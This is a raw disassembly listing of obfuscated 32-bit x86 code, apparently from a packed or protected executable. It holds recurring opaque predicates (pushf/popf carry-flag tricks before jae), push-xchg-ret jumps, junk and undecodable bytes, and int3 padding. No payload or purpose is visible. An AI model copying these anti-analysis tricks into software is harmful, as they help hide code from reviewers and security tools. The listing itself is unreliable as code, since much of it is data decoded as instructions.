  40e22e:	sar    DWORD PTR [esi+0x676d087c],1
  40e234:	mov    al,ds:0x9f087db5
  40e239:	sub    al,0xb5
  40e23b:	inc    ecx
  40e23c:	lahf   
  40e23d:	mov    ch,0x8a
  40e23f:	mov    esi,ebx
  40e241:	repz repz jmp 0x40e874
  40e248:	(bad)  
  40e249:	push   ebx
  40e24a:	inc    ecx
  40e24b:	ins    DWORD PTR es:[edi],dx
  40e24c:	mov    ch,0xb5
  40e24e:	or     BYTE PTR ds:0xfc7daeb5,bl
  40e254:	or     BYTE PTR [ebx+0x14],cl
  40e257:	cld    
  40e258:	and    DWORD PTR [esi+0x3653e159],ebp
  40e25e:	sub    eax,ecx
  40e260:	pushf  
  40e261:	and    WORD PTR [esp],0xfe
  40e267:	popf   
  40e268:	jae    0x40d29f
  40e26e:	mov    ch,0x53
  40e270:	(bad)  
  40e271:	jge    0x40e287
  40e273:	push   ebx
  40e274:	and    DWORD PTR [ecx],esp
  40e276:	pop    ecx
  40e277:	adc    al,0x14
  40e279:	dec    edx
  40e27a:	mov    ch,0xc6
  40e27c:	into   
  40e27d:	stos   BYTE PTR es:[edi],al
  40e27e:	pushf  
  40e27f:	and    WORD PTR [esp],0xfe
  40e285:	popf   
  40e286:	jae    0x40ef25
  40e28c:	and    DWORD PTR ds:0x2e084bd1,ebx
  40e292:	sub    al,0xb5
  40e294:	pop    ecx
  40e295:	adc    BYTE PTR [eax],cl
  40e297:	sbb    eax,0x7d2c1da0
  40e29c:	add    edi,DWORD PTR ss:[edi+0x3c]
  40e2a0:	pushf  
  40e2a1:	and    WORD PTR [esp],0xfe
  40e2a7:	popf   
  40e2a8:	jae    0x40c897
  40e2ae:	and    DWORD PTR [ebp+0x598fa0ae],esi
  40e2b4:	adc    al,0xb5
  40e2b6:	test   cl,dl
  40e2b8:	jge    0x40e2c2
  40e2ba:	mov    ch,0x68
  40e2bc:	add    cl,BYTE PTR [ebx+0x3ef3244d]
  40e2c2:	es jmp 0x40b78b
  40e2c8:	and    DWORD PTR [ebp-0x5ff74af8],esi
  40e2ce:	inc    ecx
  40e2cf:	scas   al,BYTE PTR es:[edi]
  40e2d0:	mov    esi,0x82b54a8f
  40e2d5:	mov    ch,0xde
  40e2d7:	test   BYTE PTR [ebp+0x21],ch
  40e2da:	cs ja  0x40e2a9
  40e2dd:	int3   
  40e2de:	int3   
	...
  40e2f7:	add    BYTE PTR [eax],al
  40e2f9:	add    bl,ch
  40e2fb:	popa   
  40e2fc:	pushf  
  40e2fd:	and    WORD PTR [esp],0xfe
  40e303:	popf   
  40e304:	jae    0x40e163
  40e30a:	loope  0x40e2ac
  40e30c:	mov    ch,0x67
  40e30e:	push   ebx
  40e30f:	sub    al,0xb5
  40e311:	pop    ecx
  40e312:	mov    al,ds:0xa0b5b514
  40e317:	mov    esi,0x44681eb5
  40e31c:	retf   
  40e31d:	add    al,BYTE PTR [eax]
  40e31f:	pause  
  40e321:	jmp    0x40cec6
  40e326:	sub    al,0x6d
  40e328:	fidiv  WORD PTR [ebp-0x4a4a4af8]
  40e32e:	and    DWORD PTR [ebp+0x14fc7efc],esi
  40e334:	jl     0x40e2d6
  40e336:	adc    al,0xa0
  40e338:	in     eax,0x6a
  40e33a:	call   DWORD PTR [ebp+0x10]
  40e33d:	cs cs jmp 0x40f174
  40e344:	mov    al,ds:0x591db5b5
  40e349:	mov    ch,0xfc
  40e34b:	or     BYTE PTR [ecx],ah
  40e34d:	mov    esi,0xb5b57ca0
  40e352:	push   ebx
  40e353:	mov    ch,0xe1
  40e355:	jge    0x40e31d
  40e357:	dec    ebx
  40e358:	push   ss
  40e359:	add    esi,DWORD PTR [ebp+0x24]
  40e35c:	pushf  
  40e35d:	and    WORD PTR [esp],0xfe
  40e363:	popf   
  40e364:	jae    0x40e220
  40e36a:	adc    BYTE PTR [ebp-0x7b929260],dh
  40e370:	and    DWORD PTR [ebp+0x808fcb5],esi
  40e376:	jl     0x40e31f
  40e378:	add    ebx,DWORD PTR [ebp+0x24]
  40e37b:	pushf  
  40e37c:	and    WORD PTR [esp],0xfe
  40e382:	popf   
  40e383:	jae    0x40be1d
  40e389:	ins    DWORD PTR es:[di],dx
  40e38b:	sub    al,0x8
  40e38d:	dec    ebx
  40e38e:	mov    ch,0xfc
  40e390:	and    DWORD PTR [ecx],esp
  40e392:	dec    ebx
  40e393:	adc    al,0xb5
  40e395:	loope  0x40e396
  40e397:	push   esi
  40e398:	pushf  
  40e399:	and    WORD PTR [esp],0xfe
  40e39f:	popf   
  40e3a0:	jae    0x40d0d3
  40e3a6:	mov    ch,0x1d
  40e3a8:	push   ebx
  40e3a9:	mov    ch,0x84
  40e3ab:	dec    edx
  40e3ac:	adc    al,0xd1
  40e3ae:	shr    DWORD PTR [esi],1
  40e3b0:	mov    ch,0xde
  40e3b2:	(bad)  
  40e3b6:	dec    ebx
  40e3b7:	add    BYTE PTR [eax],al
  40e3b9:	push   0x53
  40e3bb:	pushf  
  40e3bc:	and    WORD PTR [esp],0xfe
  40e3c2:	popf   
  40e3c3:	jae    0x40b070
  40e3c9:	and    DWORD PTR [ecx],esp
  40e3cb:	mov    ch,0x10
  40e3cd:	inc    ecx
  40e3ce:	fiadd  WORD PTR [ecx+0x53]
  40e3d1:	sub    al,0x82
  40e3d3:	mov    ch,0x59
  40e3d5:	shr    DWORD PTR [esi+ebp*1],1
  40e3d8:	sub    BYTE PTR [edx+0x669cabf3],dl
  40e3de:	and    DWORD PTR [esp],0xf9d00fe
  40e3e5:	cmp    DWORD PTR [eax+0x8ffffef],0xffffffb5
  40e3ec:	adc    BYTE PTR [eax+0x218f53be],ah
  40e3f2:	and    DWORD PTR [ebp+0x2e59d17e],esi
  40e3f8:	lea    eax,[ebx-0x17]
  40e3fb:	and    esi,edi
  40e3fd:	(bad)  
  40e3fe:	(bad)  
  40e3ff:	ds cs jmp 0x40ec45
  40e406:	fidiv  WORD PTR [ebp+0x4bb57c2e]
  40e40c:	mov    ch,0x67
  40e40e:	or     BYTE PTR [ebp+0x7c],bh
  40e411:	sub    al,0x8f
  40e413:	push   ebx
  40e414:	test   BYTE PTR [esi-0x7e],bh
  40e417:	mov    ch,0xb
  40e419:	int3   
  40e41a:	int3   
  40e41b:	int3   
	...
  40e434:	add    BYTE PTR [eax],al
  40e436:	add    BYTE PTR [edx-0x7e996355],dh
  40e43c:	and    al,0x24
  40e43e:	inc    BYTE PTR [eax]
  40e440:	popf   
  40e441:	jae    0x40db86
  40e447:	xor    BYTE PTR [ebp-0x7dd31ef8],0x8
  40e44e:	or     BYTE PTR [ebp-0x4a4a982f],dh
  40e454:	mov    ch,0xb5
  40e456:	or     dl,BYTE PTR [esi+edi*1-0x4]
  40e45a:	jmp    0x40cdba
  40e45f:	mov    ch,0xae
  40e461:	cs mov esi,0xb51dd110
  40e467:	adc    BYTE PTR [ecx],ah
  40e469:	mov    ch,0x53
  40e46b:	jle    0x40e422
  40e46d:	ins    DWORD PTR es:[edi],dx
  40e46e:	mov    ch,0xfc
  40e470:	dec    ebx
  40e471:	cld    
  40e472:	sbb    eax,0xcc4b4121
  40e477:	int3   
  40e478:	int3   
	...
  40e491:	add    BYTE PTR [eax],al
  40e493:	add    dh,al
  40e495:	sub    eax,DWORD PTR [ecx+esi*1+0x28]
  40e499:	pause  
  40e49b:	jmp    0x40c32d
  40e4a0:	and    DWORD PTR [esi-0x4b],edi
  40e4a3:	mov    ch,0x2c
  40e4a5:	test   BYTE PTR [esi],ch
  40e4a7:	mov    ch,0x21
  40e4a9:	mov    esi,0x10b514ae
  40e4ae:	inc    ecx
  40e4af:	rcr    esi,1
  40e4b1:	mov    ch,0x9f
  40e4b3:	loope  0x40e45d
  40e4b5:	jbe    0x40e507
  40e4b7:	pushf  
  40e4b8:	and    WORD PTR [esp],0xfe
  40e4be:	popf   
  40e4bf:	jae    0x40d344
  40e4c5:	(bad)  
  40e4c6:	mov    esi,0x2e21b5b5
  40e4cb:	cld    
  40e4cc:	jge    0x40e48c
  40e4ce:	or     BYTE PTR [eax],cl
  40e4d0:	scas   al,BYTE PTR es:[edi]
  40e4d1:	mov    esi,0x46926d4b
  40e4d6:	bnd cs jmp 0x40ccd5
  40e4dd:	mov    al,ds:0x21b582de
  40e4e2:	or     BYTE PTR [ebp-0x4aebdeb6],dh
  40e4e8:	pop    DWORD PTR [ecx+0x21]
  40e4eb:	mov    ch,0xb5
  40e4ed:	sbb    eax,0xae4a1db5
  40e4f2:	cld    
  40e4f3:	dec    edi
  40e4f4:	shr    ecx,0x2
  40e4f7:	cs nop
  40e4f9:	ds jmp 0x40b54b
  40e4ff:	mov    ch,0xfc
  40e501:	and    cl,0xb5
  40e504:	dec    edx
  40e505:	(bad)  
  40e506:	jge    0x40e4bd
  40e508:	lahf   
  40e509:	mov    esi,0xbeb582de
  40e50e:	adc    al,0x14
  40e510:	mov    ch,0x59
  40e512:	ja     0x40e49f
  40e514:	dec    ecx
  40e515:	push   esp
  40e516:	cld    
  40e517:	nop
  40e518:	jmp    0x40a980
  40e51d:	cmp    BYTE PTR [ecx+eiz*1+0x59],0x9f
  40e522:	jge    0x40e541
  40e524:	scas   al,BYTE PTR es:[edi]
  40e525:	or     BYTE PTR [esi*4+0x2e2182a0],ch
  40e52c:	jl     0x40e536
  40e52e:	mov    ch,0x7e
  40e530:	jge    0x40e5a5
  40e532:	mov    ecx,0x19248fef
  40e537:	cs nop
  40e539:	cs jmp 0x40dfa6
  40e53f:	jle    0x40e562
  40e541:	push   ebx
  40e542:	test   BYTE PTR [bp+0x86d],bh
  40e547:	xor    BYTE PTR [ebp+0x106db559],0x59
  40e54e:	inc    ecx
  40e54f:	mov    ch,0xea
  40e551:	movzx  ecx,WORD PTR [eax+0x14]
  40e555:	ss bnd jmp 0x40c054
  40e55c:	and    DWORD PTR [edx+0x1d107d7c],eax
  40e562:	fisubr WORD PTR [si]
  40e565:	ficomp WORD PTR [edi+0x7da04ac6]
  40e56b:	or     BYTE PTR [ecx-0x1f],al
  40e56e:	or     BYTE PTR [esi-0x75],dl
  40e571:	rcr    BYTE PTR [esi+eiz*2-0x1dbdb7f],1
  40e578:	add    BYTE PTR [ebp-0x3a757cf1],bl
  40e57e:	(bad)  
  40e57f:	push   DWORD PTR [ebp+0x14b54a9f]
  40e585:	jle    0x40e509
  40e587:	dec    edx
  40e588:	sbb    eax,0x4a21b559
  40e58d:	fidiv  WORD PTR [eax]
  40e58f:	sub    BYTE PTR [eax+edi*1],dh
  40e592:	mov    bl,0x8b
  40e594:	jle    0x40e5a6
  40e596:	pushf  
  40e597:	and    WORD PTR [esp],0xfe
  40e59d:	popf   
  40e59e:	jae    0x40bcd2
  40e5a4:	scas   al,BYTE PTR es:[edi]
  40e5a5:	(bad)  
  40e5a6:	mov    ch,0xfc
  40e5a8:	mov    ch,0x4a
  40e5aa:	test   BYTE PTR [ecx+0x59],al
  40e5ad:	(bad)  
  40e5ae:	mov    ch,0x2e
  40e5b0:	test   BYTE PTR [edx-0x160c6faf],dl
  40e5b6:	out    dx,al
  40e5b7:	sar    bh,cl
  40e5b9:	push   DWORD PTR [ebp+0x214a1dd1]
  40e5bf:	pop    ecx
  40e5c0:	adc    al,0xfc
  40e5c2:	dec    edx
  40e5c3:	sub    BYTE PTR [esi],0xb5
  40e5c6:	scas   al,BYTE PTR es:[edi]
  40e5c7:	fisub  WORD PTR [ecx]
  40e5c9:	adc    al,0x53
  40e5cb:	or     BYTE PTR [edx+0x2e],0x9f
  40e5cf:	ins    DWORD PTR es:[edi],dx
  40e5d0:	cwde   
  40e5d1:	lahf   
  40e5d2:	mov    esi,DWORD PTR [ebp+0x24]
  40e5d5:	ds cld 
  40e5d7:	ss jmp 0x40f706
  40e5dd:	jge    0x40e5ef
  40e5df:	mov    al,ds:0x8a084d1
  40e5e4:	lahf   
  40e5e5:	jl     0x40e59c
  40e5e7:	mov    ch,0x2c
  40e5e9:	fisubr WORD PTR [ebp-0x4b]
  40e5ec:	adc    BYTE PTR [ecx-0x3a],bl
  40e5ef:	ins    DWORD PTR es:[edi],dx
  40e5f0:	fs loop 0x40e5bf
  40e5f3:	int3   
  40e5f4:	int3   
	...
  40e60d:	add    BYTE PTR [eax],al
  40e60f:	add    bl,dl
  40e611:	popa   
  40e612:	push   edx
  40e613:	ss ss lea edx,es:0x40aaad
  40e61c:	xchg   DWORD PTR ss:[esp],edx
  40e620:	es ret 0x0
  40e624:	shl    DWORD PTR [eax-0x4a8292e3],1
  40e62a:	(bad)  
  40e62b:	or     cl,dl
  40e62d:	sar    DWORD PTR [esi+0x410c41],1
  40e633:	add    BYTE PTR [ebx+0x48],bh
  40e636:	ds bnd jmp 0x40c71f
  40e63d:	sbb    eax,0xbe107dfc
  40e642:	test   cl,dl
  40e644:	mov    ch,0xd1
  40e646:	pop    ecx
  40e647:	mov    al,ds:0xde21b5b5
  40e64c:	mov    ch,0x2c
  40e64e:	inc    ecx
  40e64f:	fidiv  WORD PTR [ebp+0x51bbb54a]
  40e655:	nop
  40e656:	bnd jmp 0x40f24e
  40e65c:	and    DWORD PTR [ebp+0x4a14fcb5],esi
  40e662:	mov    esi,0xae827eae
  40e667:	mov    ch,0xbe
  40e669:	(bad)  
  40e66a:	or     dh,al
  40e66c:	and    DWORD PTR [ecx],esp
  40e66e:	(bad)  
  40e66f:	mov    ch,0x8f
  40e671:	mov    ch,0x26
  40e673:	inc    DWORD PTR [esp]
  40e676:	pushf  
  40e677:	and    WORD PTR [esp],0xfe
  40e67d:	popf   
  40e67e:	jae    0x40d23f
  40e684:	mov    ch,0xb5
  40e686:	rcr    esi,1
  40e688:	mov    ch,0x1d
  40e68a:	jge    0x40e641
  40e68c:	and    DWORD PTR [esi+0x4b8fbe10],edi
  40e692:	mov    edi,eax
  40e694:	push   ecx
  40e695:	cs cld 
  40e697:	cld    
  40e698:	mov    ecx,0x40a69e
  40e69d:	cld    
  40e69e:	xchg   DWORD PTR [esp],ecx
  40e6a1:	ds ret 0x0
  40e6a5:	mov    ch,0x8
  40e6a7:	adc    BYTE PTR [ebp+0x212c5908],dh
  40e6ad:	test   BYTE PTR [ebp+0x32ba5ae],dh
  40e6b3:	jge    0x40e6d9
  40e6b5:	pushf  
  40e6b6:	and    WORD PTR [esp],0xfe
  40e6bc:	popf   
  40e6bd:	jae    0x40d2bf
  40e6c3:	mov    ch,0x4a
  40e6c5:	mov    ch,0x10
  40e6c7:	jl     0x40e68f
  40e6c9:	or     cl,ah
  40e6cb:	mov    ch,0x21
  40e6cd:	dec    ebx
  40e6ce:	mov    ch,0x14
  40e6d0:	adc    eax,0x9eb94661
  40e6d5:	lea    eax,[esi+0x3e2656be]
  40e6db:	repz lea esi,ds:0x40c30a
  40e6e2:	xrelease xchg DWORD PTR [esp],esi
  40e6e6:	cld    
  40e6e7:	ret    0x0
  40e6ea:	mov    ch,0xbe
  40e6ec:	and    esp,edi
  40e6ee:	cs mov ch,0x7e
  40e6f1:	pop    eax
  40e6f2:	add    DWORD PTR [edi],esi
  40e6f4:	int3   
  40e6f5:	int3   
  40e6f6:	int3   
	...
  40e70f:	add    BYTE PTR [eax],al
  40e711:	add    BYTE PTR [edx+0x61],dh
  40e714:	pushf  
  40e715:	and    WORD PTR [esp],0xfe
  40e71b:	popf   
  40e71c:	jae    0x40d5d8
  40e722:	(bad)  
  40e723:	mov    ch,0x7e
  40e725:	mov    ch,0x67
  40e727:	mov    esi,0xd17db52e
  40e72c:	addr16 sbb eax,0x2b4bde53
  40e732:	mov    ecx,0x2c3c81e8
  40e737:	pushf  
  40e738:	and    WORD PTR [esp],0xfe
  40e73e:	popf   
  40e73f:	jae    0x40ac32
  40e745:	jge    0x40e757
  40e747:	lahf   
  40e748:	(bad)  
  40e749:	mov    ch,0x21
  40e74b:	mov    ch,0xb5
  40e74d:	jge    0x40e7cc
  40e74f:	scas   al,BYTE PTR es:[edi]
  40e750:	inc    edi
  40e751:	add    edx,DWORD PTR [ebp+0x24]
  40e754:	pushf  
  40e755:	and    WORD PTR [esp],0xfe
  40e75b:	popf   
  40e75c:	jae    0x40f436
  40e762:	(bad)
  40e766:	inc    ecx
  40e767:	and    DWORD PTR [esi*4-0x70b44a4b],edx
  40e76e:	mov    ch,0xf8
  40e770:	cmp    DWORD PTR [ebp-0x6fa9a8b6],ecx
  40e776:	es nop
  40e778:	lea    esi,ds:0x40e457
  40e77e:	xchg   DWORD PTR ss:[esp],esi
  40e782:	ss ret 0x0
  40e786:	push   ebx
  40e787:	scas   al,BYTE PTR es:[edi]
  40e788:	mov    ch,0x2e
  40e78a:	cld    
  40e78b:	or     dh,bl
  40e78d:	adc    BYTE PTR [ebp+0x5316c6be],dh
  40e793:	push   ecx
  40e794:	nop
  40e795:	repz lea ecx,ds:0x40cb98
  40e79d:	xacquire xchg DWORD PTR [esp],ecx
  40e7a1:	ds ret 0x0
  40e7a5:	push   ebx
  40e7a6:	adc    BYTE PTR [ebp-0x4a7b4abf],dh
  40e7ac:	scas   al,BYTE PTR es:[edi]
  40e7ad:	inc    ecx
  40e7ae:	test   BYTE PTR [esi-0x3333334d],ch
	...
  40e7cc:	add    BYTE PTR [eax],al
  40e7ce:	add    cl,bh
  40e7d0:	ds push ecx
  40e7d2:	pushf  
  40e7d3:	and    WORD PTR [esp],0xfe
  40e7d9:	popf   
  40e7da:	jae    0x40ca94
  40e7e0:	shl    DWORD PTR [ebp+0x53142121],1
  40e7e6:	mov    ch,0x8
  40e7e8:	inc    ecx
  40e7e9:	(bad)  
  40e7ea:	ror    DWORD PTR [eax],1
  40e7ec:	(bad)  
  40e7ed:	mov    ch,0xb5
  40e7ef:	ficomp DWORD PTR [esi+0x55]
  40e7f2:	nop
  40e7f3:	repnz lea ebp,es:0x40d61a
  40e7fb:	xchg   DWORD PTR ss:[esp],ebp
  40e7ff:	ds ret 0x0
  40e803:	(bad)  
  40e804:	mov    ch,0xe1
  40e806:	cld    
  40e807:	mov    al,ds:0xe1deb5ae
  40e80c:	(bad)  
  40e80d:	mov    ch,0x4e
  40e80f:	int3   
  40e810:	int3   
  40e811:	int3   
	...
  40e82a:	add    BYTE PTR [eax],al
  40e82c:	add    dl,al
  40e82e:	int3   
  40e82f:	int3   
  40e830:	int3   
	...
  40e849:	add    BYTE PTR [eax],al
  40e84b:	add    BYTE PTR [ebp+0x598851],al
  40e851:	add    BYTE PTR ds:0x2655541a,ch
  40e857:	repnz lea ebp,ss:0x40f14c
  40e85f:	xrelease xchg DWORD PTR [esp],ebp
  40e863:	ds ret 0x0
  40e867:	mov    ch,0x8f
  40e869:	jle    0x40e820
  40e86b:	mov    ch,0x4a
  40e86d:	jl     0x40e835
  40e86f:	mov    esi,0x76dd4121
  40e874:	mov    edi,esi
  40e876:	push   eax
  40e877:	ds nop
  40e879:	repz lea eax,ds:0x40a577
  40e880:	xchg   DWORD PTR ss:[esp],eax
  40e884:	repz ret 0x0
  40e888:	mov    ch,0x67
  40e88a:	dec    ebx
  40e88b:	and    DWORD PTR [ecx-0x2f],ebx
  40e88e:	mov    esi,0x44b5fc21
  40e893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e894:	add    BYTE PTR [eax],al
  40e896:	push   ebx
  40e897:	push   eax
  40e898:	pushf  
  40e899:	and    WORD PTR [esp],0xfe
  40e89f:	popf   
  40e8a0:	jae    0x40f5e0
  40e8a6:	mov    ch,0xb5
  40e8a8:	(bad)  
  40e8a9:	mov    ch,0x6d
  40e8ab:	mov    ch,0x53
  40e8ad:	loope  0x40e864
  40e8af:	cs mov ch,0x2e
  40e8b2:	mov    ch,0xfc
  40e8b4:	or     ah,bh
  40e8b6:	int3   
  40e8b7:	and    eax,DWORD PTR [eax]
  40e8b9:	add    BYTE PTR [ebp+0x45],al
  40e8bc:	pop    edi
  40e8bd:	mov    edx,eax
  40e8bf:	push   ebp
  40e8c0:	repz es ds mov ebp,0x40b8c7
  40e8c8:	nop
  40e8c9:	xchg   DWORD PTR [esp],ebp
  40e8cc:	ds ret 0x0
  40e8d0:	mov    ch,0x7c
  40e8d2:	mov    ch,0x53
  40e8d4:	mov    ch,0xb5
  40e8d6:	and    esi,ebx
  40e8d8:	(bad)  
  40e8d9:	ins    DWORD PTR es:[edi],dx
  40e8da:	mov    ch,0x84
  40e8dc:	adc    al,BYTE PTR [eax]
  40e8de:	add    BYTE PTR [ebx-0x7b],bl
  40e8e1:	leave  
  40e8e2:	push   eax
  40e8e3:	ds ds lea eax,ds:0x40b66a
  40e8ec:	xacquire xchg DWORD PTR [esp],eax
  40e8f0:	repz ret 0x0
  40e8f4:	mov    ch,0x14
  40e8f6:	mov    ch,0x7d
  40e8f8:	mov    ch,0xde
  40e8fa:	and    DWORD PTR [ebp+0x515e1d41],esi
  40e900:	cs es jmp 0x40b8e6
  40e907:	mov    ch,0x53
  40e909:	fisubr WORD PTR [esi-0x4a4ab4b5]
  40e90f:	adc    al,0x9f
  40e911:	sub    al,0x2c
  40e913:	mov    ch,0x9f
  40e915:	lahf   
  40e916:	mov    esi,0x808b559
  40e91b:	xor    BYTE PTR [ebp-0x759b6ef3],0x90
  40e922:	pushf  
  40e923:	and    WORD PTR [esp],0xfe
  40e929:	popf   
  40e92a:	jae    0x40c5f9
  40e930:	jle    0x40e8e7
  40e932:	ins    DWORD PTR es:[edi],dx
  40e933:	shl    DWORD PTR [ebp-0x4ab47d84],1
  40e939:	and    DWORD PTR [bx+si-0x4a84],esp
  40e93e:	mov    ch,0x7
  40e940:	push   eax
  40e941:	cld    
  40e942:	cld    
  40e943:	jmp    0x40e8ff
  40e945:	adc    dh,al
  40e947:	inc    ecx
  40e948:	inc    ecx
  40e949:	lahf   
  40e94a:	test   cl,dl
  40e94c:	dec    ebx
  40e94d:	sbb    eax,0x21e19fc6
  40e952:	addr16 lahf 
  40e954:	test   BYTE PTR [ebx+0x7c],cl
  40e957:	(bad)  
  40e958:	and    DWORD PTR [edi+0x4ab5c61d],ecx
  40e95e:	cmp    BYTE PTR ds:0x9c60eef5,cl
  40e964:	and    WORD PTR [esp],0xfe
  40e96a:	popf   
  40e96b:	jae    0x40b68c
  40e971:	pop    ecx
  40e972:	mov    ch,0x8
  40e974:	adc    BYTE PTR cs:[eax],cl
  40e977:	fimul  WORD PTR [edx-0x22]
  40e97a:	jle    0x40e9a8
  40e97c:	dec    ebx
  40e97d:	mov    ch,0x84
  40e97f:	mov    ch,0xca
  40e981:	ret    
  40e982:	ss cld 
  40e984:	jmp    0x40d861
  40e989:	cs inc ecx
  40e98b:	test   cl,ah
  40e98d:	mov    ch,0x4a
  40e98f:	ins    DWORD PTR es:[edi],dx
  40e990:	adc    al,0x8
  40e992:	dec    edx
  40e993:	mov    ch,0x82
  40e995:	scas   al,BYTE PTR es:[edi]
  40e996:	addr16 inc ecx
  40e998:	adc    al,0xb5
  40e99a:	(bad)  
  40e99b:	mov    al,ds:0xfe0810de
  40e9a0:	add    edx,0x2
  40e9a3:	pushf  
  40e9a4:	and    WORD PTR [esp],0xfe
  40e9aa:	popf   
  40e9ab:	jae    0x40b7c9
  40e9b1:	push   ebx
  40e9b2:	or     BYTE PTR [esp+edi*2],dl
  40e9b5:	adc    al,0xbe
  40e9b7:	push   ebx
  40e9b8:	addr16 adc al,0x4b
  40e9bb:	jle    0x40ea07
  40e9bd:	mov    ch,0x1d
  40e9bf:	repnz pop ecx
  40e9c1:	cld    
  40e9c2:	ss cs jmp 0x40e044
  40e9c9:	lahf   
  40e9ca:	jl     0x40ea33
  40e9cc:	addr16 push ebx
  40e9ce:	or     BYTE PTR [esi*4+0x2eb5b5b5],dl
  40e9d5:	pop    ecx
  40e9d6:	addr16 sub al,0x84
  40e9d9:	mov    al,ds:0x21be7e4a
  40e9de:	xchg   bh,bh
  40e9e0:	dec    ebp
  40e9e1:	sub    BYTE PTR [esi],dh
  40e9e3:	ds ss jmp 0x40a961
  40e9ea:	mov    ch,0xb5
  40e9ec:	loope  0x40ea0b
  40e9ee:	mov    ch,0x41
  40e9f0:	adc    BYTE PTR [ebx+0x8],cl
  40e9f3:	or     BYTE PTR [esi-0x4b],bh
  40e9f6:	lahf   
  40e9f7:	mov    ch,0x14
  40e9f9:	(bad)  
  40e9fa:	pop    ecx
  40e9fb:	cld    
  40e9fc:	mov    ch,0xb6
  40e9fe:	test   esi,esi
  40ea00:	ss ss nop
  40ea03:	jmp    0x40c657
  40ea08:	or     BYTE PTR [bx+0x5308],cl
  40ea0d:	adc    al,0xb5
  40ea0f:	jl     0x40e9c6
  40ea11:	mov    ch,0x8f
  40ea13:	mov    al,ds:0x10fc2c6d
  40ea18:	mov    ch,0x2c
  40ea1a:	and    DWORD PTR [ebp+0x560cb8],esi
  40ea20:	add    BYTE PTR [ebx],ch
  40ea22:	int3   
  40ea23:	int3   
  40ea24:	int3   
	...
  40ea3d:	add    BYTE PTR [eax],al
  40ea3f:	add    BYTE PTR [edx],bl
  40ea41:	pusha  
  40ea42:	pushf  
  40ea43:	and    WORD PTR [esp],0xfe
  40ea49:	popf   
  40ea4a:	jae    0x40d3ff
  40ea50:	addr16 lahf 
  40ea52:	jle    0x40ea75
  40ea54:	jl     0x40eaa0
  40ea56:	mov    ch,0xbe
  40ea58:	sub    al,0x7e
  40ea5a:	(bad)  
  40ea5b:	cld    
  40ea5c:	adc    al,0x21
  40ea5e:	(bad)  
  40ea5f:	adc    ch,cl
  40ea61:	(bad)  
  40ea62:	hlt    
  40ea63:	(bad)  
  40ea64:	call   FWORD PTR [esi+eiz*2-0x1dbdb7f]
  40ea6b:	add    BYTE PTR [ebp-0x187f7cf1],bl
  40ea71:	(bad)  
  40ea72:	push   DWORD PTR [ebp+0x1d215384]
  40ea78:	mov    ch,0x9f
  40ea7a:	lahf   
  40ea7b:	adc    BYTE PTR cs:[ecx-0x43],al
  40ea7f:	xor    eax,DWORD PTR ds:0x5e6422df
  40ea85:	push   edx
  40ea86:	cld    
  40ea87:	nop
  40ea88:	es mov edx,0x40d5f8
  40ea8e:	xrelease xchg DWORD PTR [esp],edx
  40ea92:	es ret 0x0
  40ea96:	mov    ch,0x4b
  40ea98:	dec    ebx
  40ea99:	addr16 dec edx
  40ea9b:	shr    DWORD PTR [edx+eax*4],1
  40ea9e:	push   ss
  40ea9f:	jne    0x40f475
  40eaa5:	es cs jmp 0x40f475
  40eaac:	mov    ch,0xb5
  40eaae:	and    DWORD PTR [ecx+eiz*1],edx
  40eab1:	and    DWORD PTR [ebx+0x1d],edx
  40eab4:	adc    al,0x8
  40eab6:	scas   al,BYTE PTR es:[edi]
  40eab7:	mov    ch,0xd1
  40eab9:	dec    ebx
  40eaba:	pop    ecx
  40eabb:	jge    0x40ea72
  40eabd:	and    al,0xb0
  40eabf:	neg    DWORD PTR [eax+0x50]
  40eac2:	cld    
  40eac3:	repnz lea eax,ss:0x40b206
  40eacb:	xrelease xchg DWORD PTR [esp],eax
  40eacf:	cld    
  40ead0:	ret    0x0
  40ead3:	sbb    eax,0x217e7dd1
  40ead8:	and    DWORD PTR ds:0xe1d1b5b5,ebx
  40eade:	jmp    0x40eb31
  40eae0:	push   ebp
  40eae1:	cld    
  40eae2:	repz lea ebp,ds:0x40ca17
  40eaea:	nop
  40eaeb:	xchg   DWORD PTR [esp],ebp
  40eaee:	ds ret 0x0
  40eaf2:	mov    esi,0x4a2caeb5
  40eaf7:	scas   al,BYTE PTR es:[edi]
  40eaf8:	mov    ch,0x21
  40eafa:	jl     0x40eb10
  40eafc:	mov    ch,0x3a
  40eafe:	mov    ecx,ebx
  40eb00:	cld    
  40eb01:	repz jmp 0x40dd64
  40eb07:	cs mov ch,0x10
  40eb0a:	or     BYTE PTR [ebx-0x52],0x8
  40eb0e:	lahf   
  40eb0f:	adc    al,0x82
  40eb11:	cld    
  40eb12:	dec    edx
  40eb13:	or     BYTE PTR [ebp+0x21],bh
  40eb16:	cld    
  40eb17:	mov    ch,0x9f
  40eb19:	or     BYTE PTR [ebp+esi*4-0xf],bh
  40eb1d:	xchg   esi,eax
  40eb1e:	ret    
  40eb1f:	pushf  
  40eb20:	and    WORD PTR [esp],0xfe
  40eb26:	popf   
  40eb27:	jae    0x40af2c
  40eb2d:	mov    BYTE PTR [ecx+0x4b],0x1d
  40eb31:	mov    ch,0x21
  40eb33:	and    DWORD PTR [edi+ebx*4-0x6092b560],eax
  40eb3a:	cld    
  40eb3b:	cmp    BYTE PTR [ebp+0x4e8b8e2d],0x3c
  40eb42:	pushf  
  40eb43:	and    WORD PTR [esp],0xfe
  40eb49:	popf   
  40eb4a:	jae    0x40d93d
  40eb50:	mov    esi,0x67be0808
  40eb55:	mov    al,ds:0x14de412c
  40eb5a:	(bad)  
  40eb5b:	mov    ch,0xbe
  40eb5d:	fs jmp 0x40eaeb
  40eb60:	(bad)  
  40eb61:	push   ebp
  40eb62:	cld    
  40eb63:	repz repz mov ebp,0x40ae0e
  40eb6a:	xchg   DWORD PTR ds:[esp],ebp
  40eb6e:	bnd ret 0x0
  40eb72:	push   ebx
  40eb73:	or     BYTE PTR [esi*4+0x7c41b5c6],dl
  40eb7a:	jle    0x40ebf9
  40eb7c:	adc    al,0x57
  40eb7e:	int3   
  40eb7f:	int3   
  40eb80:	int3   
	...
  40eb99:	add    BYTE PTR [eax],al
  40eb9b:	add    ah,bl
  40eb9d:	out    0xcc,al
  40eb9f:	int3   
  40eba0:	int3   
	...
  40ebb9:	add    BYTE PTR [eax],al
  40ebbb:	add    BYTE PTR [edx+ecx*4-0x48],ah
  40ebbf:	xor    BYTE PTR [eax],al
  40ebc1:	add    BYTE PTR [eax],al
  40ebc3:	push   edx
  40ebc4:	cs cld 
  40ebc6:	lea    edx,es:0x40b4ec
  40ebcd:	xchg   DWORD PTR ds:[esp],edx
